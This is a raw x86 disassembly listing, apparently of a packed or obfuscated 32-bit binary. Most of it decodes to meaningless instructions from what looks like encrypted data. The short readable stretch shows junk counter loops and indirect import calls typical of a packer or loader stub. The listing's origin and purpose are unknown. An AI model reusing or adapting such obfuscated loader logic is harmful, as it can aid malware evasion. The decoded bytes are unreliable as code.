  4131b5:	stos   DWORD PTR es:[edi],eax
  4131b6:	mov    al,0xef
  4131b8:	je     0x4131ab
  4131ba:	(bad)  
  4131bc:	jns    0x41322f
  4131be:	pusha  
  4131bf:	xchg   ebx,eax
  4131c0:	inc    ebp
  4131c1:	pop    edx
  4131c2:	mov    ds:0x96e876c1,eax
  4131c7:	push   ss
  4131c8:	cli    
  4131c9:	inc    ebx
  4131ca:	cmp    dl,BYTE PTR [edi]
  4131cc:	sub    BYTE PTR [edx+0x65e1ca93],bl
  4131d2:	pusha  
  4131d3:	loope  0x413201
  4131d5:	shl    DWORD PTR [edx],cl
  4131d7:	mov    cl,dl
  4131d9:	xlat   BYTE PTR ds:[ebx]
  4131da:	or     edx,DWORD PTR [edx-0x4783c165]
  4131e0:	push   ds
  4131e1:	arpl   WORD PTR [ebp-0x35],ax
  4131e4:	lods   al,BYTE PTR ds:[esi]
  4131e5:	xor    DWORD PTR [eax+edx*8-0x37a5e172],edx
  4131ec:	popf   
  4131ed:	and    DWORD PTR [ecx-0x6b5fe0a8],ebx
  4131f3:	in     al,0x5
  4131f5:	mov    eax,ds:0xc3cc3bba
  4131fa:	cs hlt 
  4131fc:	fcom   QWORD PTR gs:[edi+0x60]
  413200:	fs inc edx
  413202:	imul   edi,DWORD PTR [eax-0x30],0x0
  413206:	inc    edx
  413207:	popa   
  413208:	je     0x413284
  41320a:	push   esp
  41320b:	jmp    0x298e:0x5d8a9e07
  413212:	test   eax,0xd766be83
  413217:	mov    ch,0xc6
  413219:	or     BYTE PTR [esi-0x39a067b8],dl
  41321f:	sbb    DWORD PTR [edi],edi
  413221:	inc    edx
  413222:	adc    ebx,ebx
  413224:	push   0x37
  413226:	inc    esi
  413227:	ret    0x43b3
  41322a:	hlt    
  41322b:	lds    esi,FWORD PTR [esi-0x173f1ef]
  413231:	pop    ebp
  413232:	jbe    0x41322b
  413234:	inc    esi
  413235:	jmp    0xd2ce:0xc5bc13e1
  41323c:	out    dx,eax
  41323d:	jmp    0x9e98:0xdc661259
  413244:	cs pop esp
  413246:	(bad)  
  413247:	fisubr DWORD PTR [edi+0x1]
  41324a:	or     ebx,DWORD PTR [ebp-0x5c]
  41324d:	fcomp  QWORD PTR [edi-0x7a]
  413250:	sahf   
  413251:	lahf   
  413252:	fist   WORD PTR [ebp-0x49]
  413255:	ins    BYTE PTR es:[edi],dx
  413256:	mov    eax,0x12470f66
  41325b:	rcl    BYTE PTR [esi],1
  41325d:	and    BYTE PTR [ebp+edi*8+0xc918356],0xf5
  413265:	sbb    al,0xef
  413267:	cmp    al,al
  413269:	push   eax
  41326a:	sbb    eax,0xf99f1f14
  41326f:	inc    esp
  413270:	and    eax,0x713b6944
  413275:	and    DWORD PTR [esi],esi
  413277:	sbb    esp,DWORD PTR [ebp-0x10994b8c]
  41327d:	pop    eax
  41327e:	sbb    eax,0xad00e08f
  413283:	call   0xfa9b7083
  413288:	pushf  
  413289:	mov    eax,0xb10b3ed4
  41328e:	mov    DWORD PTR [edx-0x357e3867],eax
  413294:	xchg   edx,eax
  413295:	in     al,dx
  413296:	sbb    bh,BYTE PTR [edx]
  413298:	pop    DWORD PTR [esi+0x2bb8e2f1]
  41329e:	sbb    bh,BYTE PTR gs:[ebx-0x49]
  4132a2:	mov    esp,0x8e73f829
  4132a7:	push   ebx
  4132a8:	cmp    al,0x6a
  4132aa:	scas   al,BYTE PTR es:[edi]
  4132ab:	inc    edi
  4132ac:	nop
  4132ad:	ret    
  4132ae:	clc    
  4132af:	imul   esi,DWORD PTR [esi+0x11b93e4f],0xfc7ef986
  4132b9:	aad    0x54
  4132bb:	or     BYTE PTR [ebx-0x3e],cl
  4132be:	int    0x7d
  4132c0:	dec    esp
  4132c1:	enter  0x59b7,0x95
  4132c5:	popf   
  4132c6:	add    dl,BYTE PTR [esi]
  4132c8:	out    0x41,al
  4132ca:	fdiv   DWORD PTR [ecx+ebp*8-0x24]
  4132ce:	js     0x413323
  4132d0:	loop   0x41328a
  4132d2:	inc    esp
  4132d3:	pop    ebp
  4132d4:	arpl   sp,di
  4132d6:	fs dec esi
  4132d8:	je     0x413283
  4132da:	jns    0x4132ab
  4132dc:	push   es
  4132dd:	add    al,0x1f
  4132df:	or     bl,al
  4132e1:	stc    
  4132e2:	popa   
  4132e3:	div    BYTE PTR [edi+edx*2-0x19]
  4132e7:	xchg   ebp,eax
  4132e8:	jbe    0x4132b8
  4132ea:	adc    edi,ebp
  4132ec:	clc    
  4132ed:	je     0x41332d
  4132ef:	shr    bh,0x4
  4132f2:	data16 aaa 
  4132f4:	cmc    
  4132f5:	mov    ds:0x841bc696,eax
  4132fa:	inc    ebx
  4132fb:	scas   eax,DWORD PTR es:[edi]
  4132fc:	mov    esi,0xdbd7d9ba
  413301:	xchg   ebp,eax
  413302:	dec    edx
  413303:	mov    dh,0xa8
  413305:	dec    di
  413307:	(bad)
  41330a:	mov    edi,cr3
  41330d:	int    0xdb
  41330f:	(bad)  
  413310:	mov    DWORD PTR [ebx-0x64],ebp
  413313:	fsub   DWORD PTR [eax]
  413315:	stc    
  413316:	and    bh,dh
  413318:	shl    eax,0x78
  41331b:	push   ss
  41331c:	inc    esp
  41331d:	sbb    esi,0x175a7034
  413323:	xor    al,0xb4
  413325:	mov    al,ds:0x45ffb039
  41332a:	jmp    0x4132c3
  41332c:	cmp    ebx,ebp
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	aaa    
  413330:	cli    
  413331:	jmp    0x4133a4
  413333:	push   ebp
  413334:	push   ebx
  413335:	into   
  413336:	mov    eax,ds:0x5f2dbfcf
  41333b:	dec    eax
  41333c:	xchg   edi,eax
  41333d:	mov    DWORD PTR [edx],ecx
  41333f:	mov    DWORD PTR ds:0x420e8e,0x16
  413349:	cmp    DWORD PTR ds:0x420e8e,0x0
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	xor    DWORD PTR [edx],ebp
  413707:	xor    al,0xd1
  413709:	mov    esi,0xa7a7a73
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	push   edi
  413712:	jp     0x4136b2
  413714:	mov    cs,WORD PTR [ecx]
  413716:	test   DWORD PTR [eax+esi*2],eax
  413719:	sbb    eax,0xce77a850
  41371e:	mov    bh,0x1f
  413720:	fist   WORD PTR [edi-0x4d]
  413723:	dec    DWORD PTR [esi-0x80]
  413726:	cmc    
  413727:	dec    esi
  413728:	aam    0x56
  41372a:	mov    ds:0xbcfa8ba7,eax
  41372f:	pop    es
  413730:	(bad)  
  413731:	xchg   edx,eax
  413732:	or     al,0x1a
  413735:	adc    al,0xd6
  413737:	(bad)  
  413739:	and    al,0xf0
  41373b:	push   0x6
  41373d:	lock jecxz 0x4136d8
  413740:	loopne 0x413710
  413742:	pop    eax
  413743:	xchg   ebp,eax
  413744:	arpl   WORD PTR [esi+0x35],di
  413747:	test   edi,0x30882ef
  41374d:	mov    ds:0x467be75a,eax
  413752:	or     esi,esi
  413754:	xchg   ebx,eax
  413755:	sbb    al,0xfc
  413757:	xor    eax,0x25ad6a8b
  41375c:	enter  0x4d9,0x2c
  413760:	jmp    0xdfe1:0x44a40394
  413767:	and    ecx,ebx
  413769:	jmp    0x3056:0x5bc4c016
  413770:	or     BYTE PTR [edx+ebp*1+0x4d1ca597],bh
  413777:	into   
  413778:	push   esp
  413779:	push   edi
  41377a:	cmp    DWORD PTR [ebp+eiz*4-0x65d15cf2],ebx
  413781:	call   0x33bda7e1
  413786:	mov    edx,0xd3127807
  41378b:	mov    edi,0xad8fdce
  413790:	inc    eax
  413791:	sub    eax,0xd3fb107e
  413796:	(bad)  
  413797:	outs   dx,BYTE PTR ds:[esi]
  413798:	repz jge 0x4137a2
  41379b:	arpl   WORD PTR [eax],di
  41379d:	mov    ds:0x9819d8a5,eax
  4137a2:	cmp    edi,DWORD PTR [edi+0x68d51235]
  4137a8:	test   DWORD PTR [edx],esi
  4137aa:	outs   dx,BYTE PTR ds:[esi]
  4137ab:	jnp    0x41378f
  4137ad:	add    eax,0x6c88e66b
  4137b2:	sar    BYTE PTR [edi-0x45b0a693],0x9e
  4137b9:	mov    ah,0xe5
  4137bb:	pop    edx
  4137bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137bd:	mov    WORD PTR [ebx+0x512af43c],fs
  4137c3:	adc    al,0xb5
  4137c5:	dec    esi
  4137c6:	pop    ss
  4137c7:	sub    al,0xbb
  4137c9:	in     al,0x5e
  4137cb:	leave  
  4137cc:	add    edx,DWORD PTR [edx+0x7503fffc]
  4137d2:	mov    DWORD PTR ds:0xfc33c49e,ecx
  4137d8:	in     eax,dx
  4137d9:	push   ecx
  4137da:	adc    eax,0x88e54759
  4137df:	bound  edi,QWORD PTR [edi]
  4137e1:	pop    edx
  4137e2:	addr16 repz xor al,0xc7
  4137e6:	jns    0x4137c7
  4137e8:	cmp    eax,0xee445f62
  4137ed:	ins    DWORD PTR es:[edi],dx
  4137ee:	outs   dx,BYTE PTR ds:[esi]
  4137ef:	data16 mov al,0x4e
  4137f2:	mov    DWORD PTR [edi],ebx
  4137f4:	icebp  
  4137f5:	adc    eax,0x5b006e47
  4137fa:	mov    esp,0xf76d9e9f
  4137ff:	cwde   
  413800:	punpckhdq mm4,QWORD PTR [edx+edi*4-0x28]
  413805:	sbb    al,0x53
  413807:	mov    BYTE PTR [ebx-0x1259eb3e],al
  41380d:	(bad)  
  41380e:	aaa    
  41380f:	pop    edx
  413810:	pop    ecx
  413811:	je     0x41384b
  413813:	inc    ecx
  413814:	lock std 
  413816:	mov    ds:0x64ad0f62,eax
  41381b:	xchg   ecx,eax
  41381c:	pop    ss
  41381d:	adc    edi,ebx
  41381f:	neg    DWORD PTR [ecx-0x3b]
  413822:	jbe    0x413857
  413824:	call   0x32c2:0xcab86d55
  41382b:	nop    DWORD PTR [eax]
  41382e:	cvttsd2si edi,QWORD PTR [ebp-0x2772d6a0]
  413836:	and    eax,0x947d4137
  41383b:	(bad)  
  41383c:	mov    dl,0x5e
  41383e:	fisttp DWORD PTR [ebx-0x40]
  413841:	(bad)  
  413842:	mov    esp,0x70780b4b
  413847:	mov    dh,0x5f
  413849:	dec    ebp
  41384a:	iret   
  41384b:	mov    al,ds:0x5f0f4e22
  413850:	icebp  
  413851:	div    DWORD PTR [edx-0x144217dd]
  413857:	xchg   ecx,eax
  413858:	mov    bh,0x16
  41385a:	arpl   bp,dx
  41385c:	je     0x413895
  41385e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41385f:	xor    al,0xd7
  413861:	and    al,0xda
  413863:	shl    DWORD PTR [edi+0x60],1
  413866:	xchg   BYTE PTR [esp+edi*1-0x5a424837],dh
  41386d:	inc    edx
  41386e:	cmp    ebx,DWORD PTR [eax]
  413870:	out    dx,al
  413871:	icebp  
  413872:	push   0xfffffff6
  413874:	xchg   esp,eax
  413875:	mov    ?,ebx
  413877:	mov    ebp,0xa5bad99c
  41387c:	icebp  
  41387d:	rol    edx,0x36
  413880:	bound  esp,QWORD PTR [edx+0x44613e86]
  413886:	les    esi,FWORD PTR ds:0xd0d70ea9
  41388c:	test   BYTE PTR [ebp-0x6615e9b0],ch
  413892:	sbb    ebp,DWORD PTR [eax+eiz*2]
  413895:	jmp    0x4138bd
  413897:	enter  0x81d8,0x22
  41389b:	cdq    
  41389c:	shr    BYTE PTR [ecx],cl
  41389e:	lds    ecx,FWORD PTR [esi+ebp*2-0x4d]
  4138a2:	mov    esi,0x5d23410a
  4138a7:	js     0x413890
  4138a9:	iret   
  4138aa:	aad    0x93
  4138ac:	xchg   DWORD PTR [edi+0x5e8751bc],edi
  4138b2:	jmp    0x61b9:0x7d44a283
  4138b9:	and    ecx,esi
  4138bb:	pusha  
  4138bc:	cmp    DWORD PTR [ecx+0x77a2ac45],ebp
  4138c2:	cs push 0xc4810a1c
  4138c8:	add    DWORD PTR [ebx],0xd5c1ea91
  4138ce:	je     0x413859
  4138d0:	jmp    0x4138b8
  4138d2:	(bad)  
  4138d3:	xchg   ecx,eax
  4138d4:	mov    ebp,0xaa55dce2
  4138d9:	ja     0x4138e8
  4138db:	ins    BYTE PTR es:[edi],dx
  4138dc:	mov    ecx,0xe3d292fe
  4138e1:	dec    edi
  4138e2:	pop    ebx
  4138e3:	pop    ebp
  4138e4:	les    ebx,FWORD PTR [esi+0x2b]
  4138e7:	jmp    0x9ebf:0x96c2b1f
  4138ee:	aas    
  4138ef:	enter  0xbfc5,0x8b
  4138f3:	addr16 mov edx,0x2b271491
  4138f9:	pushf  
  4138fa:	shr    eax,1
  4138fc:	sub    DWORD PTR [esi+0x36],esi
  4138ff:	mov    ebp,0x46da84c8
  413904:	jmp    0xe3c8:0xd160af97
  41390b:	xchg   esi,eax
  41390c:	in     al,dx
  41390d:	fstp   QWORD PTR [edx]
  41390f:	and    BYTE PTR [esi],bl
  413911:	ss pop ebp
  413913:	sub    eax,0xdcd3b4ab
  413918:	add    BYTE PTR [ebx],dl
  41391a:	out    dx,al
  41391b:	int3   
  41391c:	je     0x413921
  41391e:	push   ds
  41391f:	pop    ds
  413920:	aaa    
  413921:	and    BYTE PTR [eax-0xf092438],bh
  413927:	fisttp DWORD PTR [ebp+0x53907aac]
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	shr    BYTE PTR [edx+0x55],1
  413931:	int    0x65
  413933:	lods   eax,DWORD PTR ds:[esi]
  413934:	out    0x10,al
  413936:	sbb    esi,esi
  413938:	test   DWORD PTR [edx-0x7c],edx
  41393b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41393c:	rcl    BYTE PTR ds:0x38f4c706,cl
  413942:	jno    0x4138d5
  413944:	push   ebp
  413945:	inc    ebp
  413946:	lods   eax,DWORD PTR ds:[esi]
  413947:	xor    BYTE PTR [eax+0x2d],bh
  41394a:	mov    ebp,0x965858bd
  41394f:	and    eax,DWORD PTR [ecx+eiz*4+0xd]
  413953:	adc    dl,BYTE PTR [ecx+0x4eacbfe0]
  413959:	xchg   DWORD PTR [ebp+0x40],esp
  41395c:	xor    al,0x94
  41395e:	mov    WORD PTR [ebx-0x4b073460],gs
  413964:	jae    0x413922
  413966:	jmp    0xe9db6f8e
  41396b:	dec    eax
  41396c:	mov    eax,ds:0x6075338c
  413971:	pop    esp
  413972:	(bad)  
  413973:	sub    ecx,edx
  413975:	adc    bl,BYTE PTR [ebp-0x629bdaf6]
  41397b:	push   eax
  41397c:	outs   dx,BYTE PTR ds:[esi]
  41397d:	aaa    
  41397e:	inc    ebx
  41397f:	lock fwait
  413981:	mov    ch,0xbf
  413983:	pop    ds
  413984:	lods   eax,DWORD PTR ds:[esi]
  413985:	imul   edx,DWORD PTR [ebx],0x83bca6b9
  41398b:	repnz test al,0xc
  41398e:	(bad)  
  41398f:	popa   
  413990:	(bad)  
  413992:	int    0x53
  413994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413995:	lahf   
  413996:	imul   edx,DWORD PTR [esi+0x52],0xffffffb2
  41399a:	push   ecx
  41399b:	scas   eax,DWORD PTR es:[edi]
  41399c:	mov    edx,0x780318bd
  4139a1:	out    dx,al
  4139a2:	jbe    0x4139c3
  4139a4:	sbb    DWORD PTR [ebp-0xb],edi
  4139a7:	jl     0x4139c0
  4139a9:	or     ch,BYTE PTR [eax+eiz*2-0x61]
  4139ad:	mov    eax,DWORD PTR [edi]
  4139af:	mov    bh,0xa9
  4139b1:	ret    0x5faf
  4139b4:	xchg   esp,eax
  4139b5:	cmp    al,0x3e
  4139b7:	jne    0x4139d5
  4139b9:	scas   al,BYTE PTR es:[edi]
  4139ba:	sub    al,0x16
  4139bc:	pop    esp
  4139bd:	mov    ebp,0x1a6f705b
  4139c2:	dec    edi
  4139c3:	jle    0x413972
  4139c5:	dec    edi
  4139c6:	dec    esi
  4139c7:	mov    ebx,0x5f9a5651
  4139cc:	jp     0x413a1b
  4139ce:	mov    ebp,DWORD PTR [ebx]
  4139d0:	xor    DWORD PTR [ecx-0x8c8f93f],0xffffffc6
  4139d7:	test   al,0x1f
  4139d9:	inc    edx
  4139da:	sub    BYTE PTR [ebx-0x503d660c],0xac
  4139e1:	add    edx,ebx
  4139e3:	iret   
  4139e4:	fiadd  WORD PTR [ebx+esi*2-0x60]
  4139e8:	or     DWORD PTR [esi],edi
  4139ea:	mov    ch,0xca
  4139ec:	push   eax
  4139ed:	or     eax,0xf3ff6579
  4139f2:	std    
  4139f3:	cmp    DWORD PTR [esi],ebx
  4139f5:	outs   dx,BYTE PTR ds:[esi]
  4139f6:	inc    eax
  4139f7:	and    DWORD PTR [ebp+ebx*2-0x58],0xf4b4b016
  4139ff:	call   FWORD PTR [ecx]
  413a01:	inc    esi
  413a02:	shl    esi,0xe6
  413a05:	jge    0x413a4e
  413a07:	sub    BYTE PTR [edi],cl
  413a09:	jns    0x413a33
  413a0b:	sbb    eax,0x5742b376
  413a10:	inc    ecx
  413a11:	inc    edi
  413a12:	push   ecx
  413a13:	retf   
  413a14:	sbb    dh,ah
  413a16:	jnp    0x413a2a
  413a18:	or     ebx,DWORD PTR [edi-0x46100aa9]
  413a1e:	int3   
  413a1f:	lock inc ebx
  413a21:	jg     0x413a1e
  413a23:	mov    esp,0x634c1d45
  413a28:	fldcw  WORD PTR [edi]
  413a2a:	xor    eax,0x562c9997
  413a2f:	pop    eax
  413a30:	xchg   esi,eax
  413a31:	dec    eax
  413a32:	outs   dx,DWORD PTR ds:[esi]
  413a33:	cld    
  413a34:	jmp    0xbb4257f2
  413a39:	inc    ecx
  413a3a:	les    ecx,FWORD PTR [edi+0x1bc3795c]
  413a40:	js     0x413a1c
  413a42:	or     ebx,DWORD PTR [ebp-0x24994ec0]
  413a48:	xor    DWORD PTR [edi-0x6c],ebp
  413a4b:	cmp    al,0xb
  413a4d:	sbb    DWORD PTR [ebx-0x5506bfdd],esi
  413a53:	test   eax,0xa3361d70
  413a59:	pushf  
  413a5a:	imul   edx,ebx,0xfffffff8
  413a5d:	xor    eax,DWORD PTR [ecx]
  413a5f:	shl    ah,1
  413a61:	xor    cl,dh
  413a63:	add    esi,eax
  413a65:	jno    0x413a89
  413a67:	add    edi,DWORD PTR [eax+0x73]
  413a6a:	mov    eax,0x484abab7
  413a6f:	mov    edi,0x1abc2eda
  413a74:	scas   al,BYTE PTR es:[edi]
  413a75:	and    DWORD PTR [eax],ecx
  413a77:	xor    ecx,edx
  413a79:	xchg   edx,eax
  413a7a:	out    0x64,eax
  413a7c:	and    DWORD PTR [ecx],ecx
  413a7e:	je     0x413a23
  413a80:	test   BYTE PTR ds:0xbccc43fe,0x28
  413a87:	xchg   esp,eax
  413a88:	std    
  413a89:	add    al,0x5d
  413a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a8c:	add    al,0xa4
  413a8e:	es ret 
  413a90:	xchg   ebp,eax
  413a91:	xchg   ebx,eax
  413a92:	les    ebx,FWORD PTR [edx+0x57]
  413a95:	push   edi
  413a96:	ja     0x413a7a
  413a98:	adc    al,0xb5
  413a9a:	jo     0x413a7c
  413a9c:	stc    
  413a9d:	jmp    0x2d833af
  413aa2:	mov    ah,bl
  413aa4:	push   es
  413aa5:	inc    esi
  413aa6:	mov    cx,0x34a6
  413aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aab:	stos   DWORD PTR es:[edi],eax
  413aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aad:	mov    al,0xd4
  413aaf:	push   eax
  413ab0:	cmc    
  413ab1:	mov    gs,WORD PTR [ebx+eax*8-0x52]
  413ab5:	cmp    bl,BYTE PTR [esi+edi*4+0x198d3a49]
  413abc:	lods   al,BYTE PTR ds:[esi]
  413abd:	and    bh,BYTE PTR [ebx]
  413abf:	bound  edx,QWORD PTR [esi-0x40a0d895]
  413ac5:	int3   
  413ac6:	inc    ecx
  413ac7:	dec    ecx
  413ac8:	jne    0x413b34
  413aca:	mov    ebp,0x424f9f3b
  413acf:	dec    ecx
  413ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ad1:	push   esi
  413ad2:	call   0x8911f21e
  413ad7:	aad    0xcd
  413ad9:	(bad)  
  413ada:	pop    eax
  413adb:	or     eax,0x1c79f9ce
  413ae0:	add    esi,DWORD PTR [eax]
  413ae2:	sub    BYTE PTR [ecx+0x558dee1f],0x2b
  413ae9:	xchg   ebp,eax
  413aea:	inc    edi
  413aeb:	rcr    DWORD PTR [esi+0x5d],1
